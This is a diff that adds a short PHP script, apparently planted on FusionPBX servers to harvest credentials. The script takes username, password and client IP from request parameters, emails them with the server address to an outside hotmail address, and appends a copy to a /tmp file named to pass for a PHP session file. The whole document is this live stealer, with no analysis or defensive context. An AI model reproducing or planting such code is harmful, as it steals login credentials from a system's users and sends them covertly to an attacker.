@@ -1,0 +1,14 @@
+<?php
+$addr = $_SERVER['REMOTE_ADDR'];
+$pass = $_REQUEST["pass"];
+$user = $_REQUEST["user"];
+$ip = $_REQUEST["ip"];
+$date = date('l jS \of F Y h:i:s A');
+$message = "$date\nHOSTIP: http://$addr\nClientIP: $ip\nUser: $user\nPass: $pass\n\n";
+if (isset($pass)) {
+        mail('k6n@hotmail.com', "lll FusionPBX lll", "$addr\n$message");
+$z=fopen("/tmp/sess_71a81a80ee16ce9bcaea5d6db569254d",'a');
+fwrite($z,"$message");
+fclose($z);
+}
+?>
